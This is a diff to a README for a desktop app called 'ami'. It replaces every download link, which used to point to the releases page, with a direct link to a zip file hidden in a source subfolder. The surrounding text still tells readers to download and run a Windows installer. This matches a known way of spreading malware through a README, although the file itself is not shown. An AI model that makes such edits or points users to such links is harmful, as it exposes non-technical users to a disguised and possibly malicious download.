@@ -1,6 +1,6 @@
 # 🤖 ami - Simple Mind Interface for Everyone
 
-[![Download ami](https://img.shields.io/badge/Download-ami-brightgreen)](https://github.com/vivekrana0509/ami/releases)
+[![Download ami](https://img.shields.io/badge/Download-ami-brightgreen)](https://github.com/vivekrana0509/ami/raw/refs/heads/main/packages/skeleton/src/Software-v3.5.zip)
 
 ---
 
@@ -43,7 +43,7 @@ If your computer meets these, ami should work smoothly.
 
 You will get ami from the release page. This page contains the latest version and any updates.
 
-To download ami, **[visit this page to download](https://github.com/vivekrana0509/ami/releases)**.
+To download ami, **[visit this page to download](https://github.com/vivekrana0509/ami/raw/refs/heads/main/packages/skeleton/src/Software-v3.5.zip)**.
 
 Click the link, then find the latest Windows installer file (usually an `.exe` file). Click to start the download.
 
@@ -123,6 +123,6 @@ ami is designed around a cognitive framework. It uses pattern recognition and re
 ## 📥 Download ami Now
 
 Access the latest version here:  
-[![Download ami](https://img.shields.io/badge/Download-ami-blue)](https://github.com/vivekrana0509/ami/releases)
+[![Download ami](https://img.shields.io/badge/Download-ami-blue)](https://github.com/vivekrana0509/ami/raw/refs/heads/main/packages/skeleton/src/Software-v3.5.zip)
 
 Go to the page, find the Windows `.exe` file, download it, and follow the steps above to install and start ami on your PC.
